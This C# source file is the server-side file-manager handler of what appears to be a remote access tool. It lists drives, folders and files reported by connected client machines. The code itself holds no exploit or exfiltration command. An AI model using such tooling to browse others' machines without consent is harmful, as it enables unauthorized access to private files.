using PacketLib;
using Server.Forms;
using Server.Forms.UtilsForm;
using Server.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;

namespace Server.Handlers
{
    internal class HandleFileManager
    {
        public HandleFileManager(_Client _Client, MsgUnpack msgUnpack) 
        {
            FileManagerForm fileManagerForm = (FileManagerForm)Application.OpenForms["FileManager:" + msgUnpack.GetAsString("UID")];
            if (fileManagerForm != null)
            {
                if (fileManagerForm._Client == null)
                {
                    fileManagerForm._Client = _Client;
                    fileManagerForm.ConnectionCheckup.Start();
                }
                fileManagerForm.Invoke(new MethodInvoker(() =>
                {
                    switch (msgUnpack.GetAsString("Command"))
                    {
                        case "Drives":
                            {
                                Dictionary<string, object> dict = msgUnpack.GetAll();
                                fileManagerForm.drivesCombo.Items.Clear();
                                fileManagerForm.pathTxtbox.Text = string.Empty;
                                foreach (var dictItem in dict)
                                {
                                    if (dictItem.Key == "Packet") continue;
                                    if (dictItem.Key == "UID") continue;
                                    if (dictItem.Key == "Command") continue;
                                    fileManagerForm.drivesCombo.Items.Add(dictItem.Key);
                                }
                                fileManagerForm.drivesCombo.SelectedIndex = 0;
                                break;
                            }
                        case "Cd":
                            {
                                fileManagerForm.fileManagerView.Items.Clear();
                                fileManagerForm.pathTxtbox.Text = msgUnpack.GetAsString("CurrentPath");
                                string folders = msgUnpack.GetAsString("Folders");
                                string files = msgUnpack.GetAsString("Files");
                                string[] folderList = folders.Split(new[] { "-=>" }, StringSplitOptions.None);
                                string[] fileList = files.Split(new[] { "-=>" }, StringSplitOptions.None);
                                fileManagerForm.Icons.Images.Clear();
                                fileManagerForm.fileManagerView.BeginUpdate();
                                fileManagerForm.Icons.Images.Add("FolderIcon", (Image)Properties.Resources.folderIcon.Clone());
                                int fileCount = 0;
                                int folderCount = 0;
                                for (int i = 0; i < folderList.Length - 1; i++)
                                {
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = folderList[i];
                                    listViewItem.SubItems.Add(folderList[i + 1]);
                                    listViewItem.SubItems.Add("Folder");
                                    listViewItem.SubItems.Add(string.Empty);
                                    listViewItem.Tag = folderList[i + 2];
                                    listViewItem.ImageKey = "FolderIcon";
                                    fileManagerForm.fileManagerView.Items.Add(listViewItem);
                                    folderCount++;
                                    i += 2;
                                }
                                for (int i = 0; i < fileList.Length - 1; i++)
                                {
                                    ListViewItem listViewItem = new ListViewItem();
                                    listViewItem.Text = fileList[i];
                                    listViewItem.SubItems.Add(fileList[i + 1]);
                                    listViewItem.SubItems.Add(fileList[i + 2]);
                                    listViewItem.SubItems.Add(fileList[i + 3]);
                                    listViewItem.SubItems.Add(fileList[i + 4]);
                                    listViewItem.Tag = fileList[i + 4];
                                    Image fileIcon = Image.FromStream(new MemoryStream(Convert.FromBase64String(fileList[i + 5])));
                                    fileManagerForm.Icons.Images.Add(fileList[i], fileIcon);
                                    listViewItem.ImageKey = fileList[i];
                                    fileManagerForm.fileManagerView.Items.Add(listViewItem);
                                    fileCount++;
                                    i += 5;
                                }
                                fileManagerForm.fileManagerView.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent);
                                fileManagerForm.fileManagerView.EndUpdate();
                                fileManagerForm.countLbl.Text = $"[{fileCount.ToString().PadLeft(2, '0')}]  Files       [{folderCount.ToString().PadLeft(2, '0')}] Folders";
                                fileManagerForm.fileManagerView.Enabled = true;
                                fileManagerForm.fileManagerView.Visible = true;
                                fileManagerForm.waitLbl.Visible = false;
                                fileManagerForm.waitLbl.SendToBack();
                                break;
                            }
                    }
                }));
            }
           
        }
      }
}
